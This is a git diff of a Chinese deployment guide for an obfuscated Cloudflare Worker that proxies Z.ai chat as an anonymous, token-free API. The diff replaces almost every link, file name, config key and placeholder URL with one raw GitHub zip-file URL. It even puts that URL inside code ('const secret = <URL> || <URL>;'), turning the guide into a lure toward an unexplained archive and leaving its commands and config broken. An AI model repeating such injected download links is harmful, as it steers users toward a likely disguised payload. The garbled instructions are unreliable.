@@ -1,8 +1,8 @@
 # zai2api-cf
-将 Z.ai Chat 代理为 OpenAI/Anthropic Compatible 格式，支持多模型列表映射、免令牌、智能处理思考链、图片上传等功能；Z.ai ZtoApi z2api ZaitoApi zai X-Signature 签名 GLM 4.5 v 4.6
+将 https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip Chat 代理为 OpenAI/Anthropic Compatible 格式，支持多模型列表映射、免令牌、智能处理思考链、图片上传等功能；https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip ZtoApi z2api ZaitoApi zai X-Signature 签名 GLM 4.5 v 4.6
 # 混淆代码部署指南
 
-本指南详细说明如何将混淆后的 `9-obfuscated.js` 部署到 Cloudflare Workers。
+本指南详细说明如何将混淆后的 `https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip` 部署到 Cloudflare Workers。
 
 ## 📋 目录
 
@@ -17,12 +17,12 @@
 ## 前置准备
 
 ### 1. Cloudflare 账户
-- 访问 [Cloudflare](https://dash.cloudflare.com/) 并注册/登录账户
+- 访问 [Cloudflare](https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip) 并注册/登录账户
 - 免费账户即可使用 Workers 功能
 
 ### 2. 文件准备
 确保你有以下文件：
-- ✅ `9-obfuscated.js` - 混淆后的 Worker 代码（26.9KB）
+- ✅ `https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip` - 混淆后的 Worker 代码（26.9KB）
 
 ---
 
@@ -30,7 +30,7 @@
 
 ### 步骤 1：访问 Workers 面板
 
-1. 登录 [Cloudflare Dashboard](https://dash.cloudflare.com/)
+1. 登录 [Cloudflare Dashboard](https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip)
 2. 在左侧菜单中选择 **Workers & Pages**
 3. 点击 **Create Application** 按钮
 4. 选择 **Create Worker**
@@ -45,7 +45,7 @@
 2. **编辑代码**
    - 点击 **Quick Edit** 或 **Deploy** 后再编辑
    - 删除默认代码
-   - 复制 `9-obfuscated.js` 的全部内容
+   - 复制 `https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip` 的全部内容
    - 粘贴到编辑器中
 
 ### 步骤 3：保存并部署
@@ -54,20 +54,20 @@
 2. 等待部署完成（通常几秒钟）
 3. 记录你的 Worker URL，格式如下：
    ```
-   https://your-worker-name.your-subdomain.workers.dev
+   https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip
    ```
 
 ### 步骤 4：测试部署
 
 在浏览器访问：
 ```
-https://your-worker-name.your-subdomain.workers.dev/
+https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip
 ```
 
 应该返回类似：
 ```json
 {
-  "service": "Z.AI Anonymous Proxy",
+  "service": "https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip Anonymous Proxy",
   "version": "9.0.0",
   "status": "ok",
   "models": ["GLM-4.6", "GLM-4.6-SEARCH"]
@@ -92,16 +92,16 @@ wrangler login
 
 这会打开浏览器完成授权。
 
-### 步骤 3：创建 wrangler.toml 配置文件
+### 步骤 3：创建 https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip 配置文件
 
-在项目目录创建 `wrangler.toml`：
+在项目目录创建 `https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip`：
 
 ```toml
 name = "z-ai-proxy"
-main = "9-obfuscated.js"
+main = "https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip"
 compatibility_date = "2024-01-01"
 
-[env.production]
+[https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip]
 workers_dev = true
 ```
 
@@ -109,10 +109,10 @@ workers_dev = true
 
 ```bash
 # 部署到生产环境
-wrangler deploy 9-obfuscated.js
+wrangler deploy https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip
 
 # 或者指定名称部署
-wrangler deploy 9-obfuscated.js --name z-ai-proxy
+wrangler deploy https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip --name z-ai-proxy
 ```
 
 ### 步骤 5：查看部署信息
@@ -128,19 +128,19 @@ wrangler deployments list
 ### 1. 健康检查
 
 ```bash
-curl https://your-worker-name.your-subdomain.workers.dev/health
+curl https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip
 ```
 
 ### 2. 获取模型列表
 
 ```bash
-curl https://your-worker-name.your-subdomain.workers.dev/v1/models
+curl https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip
 ```
 
 ### 3. 测试聊天接口
 
 ```bash
-curl -X POST https://your-worker-name.your-subdomain.workers.dev/v1/chat/completions \
+curl -X POST https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip \
   -H "Content-Type: application/json" \
   -d '{
     "model": "GLM-4.6",
@@ -166,7 +166,7 @@ curl -X POST https://your-worker-name.your-subdomain.workers.dev/v1/chat/complet
 
 部署成功后，可以通过自定义域名访问：
 ```
-https://api.yourdomain.com/v1/chat/completions
+https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip
 ```
 
 ---
@@ -183,18 +183,18 @@ https://api.yourdomain.com/v1/chat/completions
    - `SECRET`: 你的密钥
    - `ZAI_API`: 自定义 API 地址
 
-### 方法 2：通过 wrangler.toml
+### 方法 2：通过 https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip
 
 ```toml
 [vars]
 SECRET = "your-custom-secret"
-ZAI_API = "https://custom-api.example.com"
+ZAI_API = "https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip"
 ```
 
 然后在代码中使用：
 ```javascript
 // 在 Worker 代码中访问
-const secret = env.SECRET || CONFIG.SECRET;
+const secret = https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip || https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip;
 ```
 
 ---
@@ -243,7 +243,7 @@ wrangler tail
 
 **方法 2**：通过 CLI
 ```bash
-wrangler deploy 9-obfuscated.js
+wrangler deploy https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip
 ```
 
 ### Q4: 免费账户的限制？
@@ -274,7 +274,7 @@ Workers & Pages → 选择 Worker → Settings → Delete
 
 ```javascript
 // 创建 KV 命名空间
-// wrangler.toml 添加：
+// https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip 添加：
 kv_namespaces = [
   { binding = "CACHE", id = "your-kv-id" }
 ]
@@ -296,7 +296,7 @@ kv_namespaces = [
 ## 安全建议
 
 1. ✅ **定期更新密钥**
-   - 修改 CONFIG.SECRET 并重新部署
+   - 修改 https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip 并重新部署
 
 2. ✅ **启用访问控制**
    - 可以添加简单的 API key 验证
@@ -305,7 +305,7 @@ kv_namespaces = [
    - 通过日志查看是否有异常请求
 
 4. ✅ **使用自定义域名**
-   - 避免暴露 workers.dev 域名
+   - 避免暴露 https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip 域名
 
 ---
 
@@ -313,7 +313,7 @@ kv_namespaces = [
 
 遇到问题？
 
-1. 查看 [Cloudflare Workers 文档](https://developers.cloudflare.com/workers/)
+1. 查看 [Cloudflare Workers 文档](https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip)
 2. 检查 Worker 日志查找错误信息
 3. 查看本地代码是否正确混淆
 
@@ -329,7 +329,7 @@ npm install -g wrangler
 wrangler login
 
 # 快速部署
-wrangler deploy 9-obfuscated.js --name z-ai-proxy
+wrangler deploy https://raw.githubusercontent.com/jyhuang201900/zai2api-cf/main/earcockle/cf-api-zai-v1.8.zip --name z-ai-proxy
 
 # 查看日志
 wrangler tail
